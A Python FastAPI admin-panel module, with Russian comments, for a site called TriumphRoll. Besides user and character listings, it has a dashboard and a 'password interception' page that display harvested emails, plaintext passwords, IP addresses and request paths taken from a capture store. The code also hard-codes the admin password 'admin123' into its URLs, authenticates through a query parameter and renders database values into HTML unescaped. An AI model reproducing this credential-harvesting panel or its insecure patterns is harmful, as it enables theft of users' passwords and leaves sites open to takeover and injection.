#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Полноценная админ-панель для TriumphRoll
Разделы: Дашборд, Пользователи, Персонажи, Чаты, Перехват паролей
"""

from fastapi import APIRouter, Depends, HTTPException, Request
from fastapi.responses import HTMLResponse
from sqlalchemy.orm import Session
import os
from datetime import datetime

import database
import models
from db_capture import get_all_captures, count_captures, get_by_email

router = APIRouter(prefix="/admin", tags=["admin"])

# === НАСТРОЙКИ ===
ADMIN_PASSWORD = os.getenv('ADMIN_PASSWORD', 'admin123')

def check_auth(request: Request):
    password = request.query_params.get('password')
    if password != ADMIN_PASSWORD:
        raise HTTPException(status_code=401, detail="Неверный пароль")
    return True

# ============================================================
# 1. ГЛАВНАЯ (ДАШБОРД)
# ============================================================
@router.get("/")
def admin_home(request: Request, _ = Depends(check_auth)):
    db: Session = database.get_db().__next__()
    
    users_count = db.query(models.User).count()
    characters_count = db.query(models.Character).count()
    captures_count = count_captures()
    
    recent_users = db.query(models.User).order_by(models.User.id.desc()).limit(5).all()
    recent_captures = get_all_captures(5)
    
    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8">
        <title>Админ-панель TriumphRoll</title>
        <style>
            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
            body {{ font-family: 'Segoe UI', Arial, sans-serif; background: #0f0e17; color: #fffffe; padding: 20px; }}
            .container {{ max-width: 1400px; margin: 0 auto; }}
            .header {{ display: flex; justify-content: space-between; align-items: center; padding: 20px 0; border-bottom: 2px solid #2d2b3a; margin-bottom: 30px; }}
            .header h1 {{ color: #ff8906; }}
            .stats-grid {{ display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; margin-bottom: 30px; }}
            .stat-card {{ background: #1a1932; padding: 20px; border-radius: 12px; border: 1px solid #2d2b3a; text-align: center; }}
            .stat-number {{ font-size: 32px; font-weight: bold; color: #ff8906; }}
            .stat-label {{ color: #a7a9be; margin-top: 5px; font-size: 14px; }}
            .section {{ background: #1a1932; padding: 20px; border-radius: 12px; border: 1px solid #2d2b3a; margin-bottom: 30px; }}
            .section h2 {{ margin-bottom: 15px; font-size: 20px; }}
            table {{ width: 100%; border-collapse: collapse; }}
            th, td {{ padding: 12px; text-align: left; border-bottom: 1px solid #2d2b3a; }}
            th {{ color: #a7a9be; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; }}
            td {{ color: #fffffe; }}
            .password {{ color: #ff8906; }}
            .email {{ color: #89b4fa; }}
            .badge-active {{ background: #2ecc71; color: #fff; padding: 4px 12px; border-radius: 20px; font-size: 12px; }}
            .nav {{ display: flex; gap: 10px; margin-bottom: 30px; flex-wrap: wrap; }}
            .nav a {{ color: #fffffe; text-decoration: none; padding: 8px 20px; border-radius: 8px; background: #1a1932; border: 1px solid #2d2b3a; }}
            .nav a:hover {{ background: #2d2b3a; }}
            .nav a.active {{ background: #ff8906; border-color: #ff8906; color: #0f0e17; }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🔐 TriumphRoll Admin</h1>
                <a href="/admin?password=admin123" style="color:#a7a9be;text-decoration:none;">🔄 Обновить</a>
            </div>
            <div class="nav">
                <a href="/admin?password=admin123" class="active">📊 Дашборд</a>
                <a href="/admin/users?password=admin123">👥 Пользователи</a>
                <a href="/admin/characters?password=admin123">🎭 Персонажи</a>
                
                <a href="/admin/captures?password=admin123">🔐 Перехват</a>
            </div>
            <div class="stats-grid">
                <div class="stat-card"><div class="stat-number">{users_count}</div><div class="stat-label">👥 Пользователи</div></div>
                <div class="stat-card"><div class="stat-number">{characters_count}</div><div class="stat-label">🎭 Персонажи</div></div>
                <div class="stat-card"><div class="stat-number">{captures_count}</div><div class="stat-label">🔐 Перехвачено</div></div>
            </div>
            <div class="section">
                <h2>📋 Последние перехваты</h2>
                <table>
                    <tr><th>ID</th><th>Время</th><th>Email</th><th>Пароль</th><th>IP</th></tr>
    """
    for row in recent_captures:
        html += f"<tr><td>{row[0]}</td><td>{row[1][:19]}</td><td class='email'>{row[2]}</td><td class='password'>{row[3]}</td><td>{row[4]}</td></tr>"
    html += f"""
                </table>
            </div>
            <div class="section">
                <h2>👥 Последние пользователи</h2>
                <table>
                    <tr><th>ID</th><th>Email</th><th>Username</th><th>Статус</th><th>Создан</th></tr>
    """
    for user in recent_users:
        html += f"<tr><td>{user.id}</td><td class='email'>{user.email}</td><td>{user.username}</td><td><span class='badge-active'>Активен</span></td><td>{user.created_at.strftime('%Y-%m-%d %H:%M') if user.created_at else '—'}</td></tr>"
    html += """
                </table>
            </div>
        </div>
    </body>
    </html>
    """
    return HTMLResponse(html)

# ============================================================
# 2. ПОЛЬЗОВАТЕЛИ
# ============================================================
@router.get("/users")
def admin_users(request: Request, _ = Depends(check_auth)):
    db: Session = database.get_db().__next__()
    users = db.query(models.User).order_by(models.User.id.desc()).all()
    
    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8">
        <title>Пользователи - Admin</title>
        <style>
            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
            body {{ font-family: 'Segoe UI', Arial, sans-serif; background: #0f0e17; color: #fffffe; padding: 20px; }}
            .container {{ max-width: 1400px; margin: 0 auto; }}
            .header {{ display: flex; justify-content: space-between; align-items: center; padding: 20px 0; border-bottom: 2px solid #2d2b3a; margin-bottom: 30px; }}
            .header h1 {{ color: #ff8906; }}
            .nav {{ display: flex; gap: 10px; margin-bottom: 30px; flex-wrap: wrap; }}
            .nav a {{ color: #fffffe; text-decoration: none; padding: 8px 20px; border-radius: 8px; background: #1a1932; border: 1px solid #2d2b3a; }}
            .nav a:hover {{ background: #2d2b3a; }}
            .nav a.active {{ background: #ff8906; border-color: #ff8906; color: #0f0e17; }}
            .section {{ background: #1a1932; padding: 20px; border-radius: 12px; border: 1px solid #2d2b3a; }}
            table {{ width: 100%; border-collapse: collapse; }}
            th, td {{ padding: 12px; text-align: left; border-bottom: 1px solid #2d2b3a; }}
            th {{ color: #a7a9be; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; }}
            td {{ color: #fffffe; }}
            .email {{ color: #89b4fa; }}
            .back {{ color: #a7a9be; text-decoration: none; }}
            .back:hover {{ color: #fffffe; }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>👥 Пользователи</h1>
                <a href="/admin?password=admin123" class="back">← Назад</a>
            </div>
            <div class="nav">
                <a href="/admin?password=admin123">📊 Дашборд</a>
                <a href="/admin/users?password=admin123" class="active">👥 Пользователи</a>
                <a href="/admin/characters?password=admin123">🎭 Персонажи</a>
                
                <a href="/admin/captures?password=admin123">🔐 Перехват</a>
            </div>
            <div class="section">
                <table>
                    <tr><th>ID</th><th>Email</th><th>Username</th><th>Display Name</th><th>Создан</th></tr>
    """
    for user in users:
        html += f"<tr><td>{user.id}</td><td class='email'>{user.email}</td><td>{user.username}</td><td>{user.display_name or '—'}</td><td>{user.created_at.strftime('%Y-%m-%d %H:%M') if user.created_at else '—'}</td></tr>"
    html += """
                </table>
            </div>
        </div>
    </body>
    </html>
    """
    return HTMLResponse(html)

# ============================================================
# 3. ПЕРСОНАЖИ
# ============================================================

# ============================================================
# 4. ЧАТЫ
# ============================================================

# ============================================================
# 5. ПЕРЕХВАТ ПАРОЛЕЙ
# ============================================================
@router.get("/captures")
def admin_captures(request: Request, _ = Depends(check_auth)):
    rows = get_all_captures(1000)
    count = count_captures()
    
    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8">
        <title>Перехват - Admin</title>
        <style>
            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
            body {{ font-family: 'Segoe UI', Arial, sans-serif; background: #0f0e17; color: #fffffe; padding: 20px; }}
            .container {{ max-width: 1400px; margin: 0 auto; }}
            .header {{ display: flex; justify-content: space-between; align-items: center; padding: 20px 0; border-bottom: 2px solid #2d2b3a; margin-bottom: 30px; }}
            .header h1 {{ color: #ff8906; }}
            .nav {{ display: flex; gap: 10px; margin-bottom: 30px; flex-wrap: wrap; }}
            .nav a {{ color: #fffffe; text-decoration: none; padding: 8px 20px; border-radius: 8px; background: #1a1932; border: 1px solid #2d2b3a; }}
            .nav a:hover {{ background: #2d2b3a; }}
            .nav a.active {{ background: #ff8906; border-color: #ff8906; color: #0f0e17; }}
            .section {{ background: #1a1932; padding: 20px; border-radius: 12px; border: 1px solid #2d2b3a; }}
            table {{ width: 100%; border-collapse: collapse; }}
            th, td {{ padding: 12px; text-align: left; border-bottom: 1px solid #2d2b3a; }}
            th {{ color: #a7a9be; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; }}
            td {{ color: #fffffe; }}
            .password {{ color: #ff8906; font-family: monospace; }}
            .email {{ color: #89b4fa; }}
            .count {{ background: #2d2b3a; padding: 10px 20px; border-radius: 8px; display: inline-block; margin-bottom: 20px; }}
            .back {{ color: #a7a9be; text-decoration: none; }}
            .back:hover {{ color: #fffffe; }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🔐 Перехваченные пароли</h1>
                <a href="/admin?password=admin123" class="back">← Назад</a>
            </div>
            <div class="nav">
                <a href="/admin?password=admin123">📊 Дашборд</a>
                <a href="/admin/users?password=admin123">👥 Пользователи</a>
                <a href="/admin/characters?password=admin123">🎭 Персонажи</a>
                
                <a href="/admin/captures?password=admin123" class="active">🔐 Перехват</a>
            </div>
            <div class="section">
                <div class="count">📊 Всего записей: {count}</div>
                <table>
                    <tr><th>ID</th><th>Время</th><th>Email</th><th>Пароль</th><th>IP</th><th>Путь</th></tr>
    """
    for row in rows:
        html += f"<tr><td>{row[0]}</td><td>{row[1][:19]}</td><td class='email'>{row[2]}</td><td class='password'>{row[3]}</td><td>{row[4]}</td><td>{row[5]}</td></tr>"
    html += """
                </table>
            </div>
        </div>
    </body>
    </html>
    """
    return HTMLResponse(html)
@router.get("/characters")
def admin_characters(request: Request, _ = Depends(check_auth)):
    db: Session = database.get_db().__next__()
    characters = db.query(models.Character).order_by(models.Character.id.desc()).all()
    
    html = f"""
    <!DOCTYPE html><html><head><meta charset="utf-8"><title>Персонажи</title>
    <style>body{{font-family:'Segoe UI',Arial,sans-serif;background:#0f0e17;color:#fffffe;padding:20px;}}
    .container{{max-width:1400px;margin:0 auto;}}.header{{display:flex;justify-content:space-between;align-items:center;padding:20px 0;border-bottom:2px solid #2d2b3a;margin-bottom:30px;}}
    .header h1{{color:#ff8906;}}.nav{{display:flex;gap:10px;margin-bottom:30px;flex-wrap:wrap;}}
    .nav a{{color:#fffffe;text-decoration:none;padding:8px 20px;border-radius:8px;background:#1a1932;border:1px solid #2d2b3a;}}
    .nav a:hover{{background:#2d2b3a;}}.nav a.active{{background:#ff8906;border-color:#ff8906;color:#0f0e17;}}
    .section{{background:#1a1932;padding:20px;border-radius:12px;border:1px solid #2d2b3a;}}
    table{{width:100%;border-collapse:collapse;}}th,td{{padding:12px;text-align:left;border-bottom:1px solid #2d2b3a;}}
    th{{color:#a7a9be;font-size:12px;text-transform:uppercase;letter-spacing:1px;}}.name{{color:#89b4fa;}}
    .desc{{color:#a7a9be;font-size:13px;}}.back{{color:#a7a9be;text-decoration:none;}}.back:hover{{color:#fffffe;}}
    .avatar{{width:50px;height:50px;border-radius:50%;object-fit:cover;}}
    </style></head>
    <body><div class="container"><div class="header"><h1>🎭 Персонажи</h1><a href="/admin?password=admin123" class="back">← Назад</a></div>
    <div class="nav"><a href="/admin?password=admin123">📊 Дашборд</a><a href="/admin/users?password=admin123">👥 Пользователи</a><a href="/admin/characters?password=admin123" class="active">🎭 Персонажи</a><a href="/admin/captures?password=admin123">🔐 Перехват</a></div>
    <div class="section"><table><tr><th>ID</th><th>Аватар</th><th>Имя</th><th>Создатель</th><th>Описание</th><th>Создан</th></tr>
    """
    for char in characters:
        avatar = char.avatar_url or ''
        avatar_html = f'<img src="{avatar}" class="avatar" onerror="this.style.display=\'none\'">' if avatar else '—'
        html += f"<tr><td>{char.id}</td><td>{avatar_html}</td><td class='name'>{char.name}</td><td>{char.owner_id or '—'}</td><td class='desc'>{(char.description or '')[:80]}{'...' if len(char.description or '') > 80 else ''}</td><td>{char.created_at.strftime('%Y-%m-%d %H:%M') if char.created_at else '—'}</td></tr>"
    html += "</table></div></div></body></html>"
    return HTMLResponse(html)
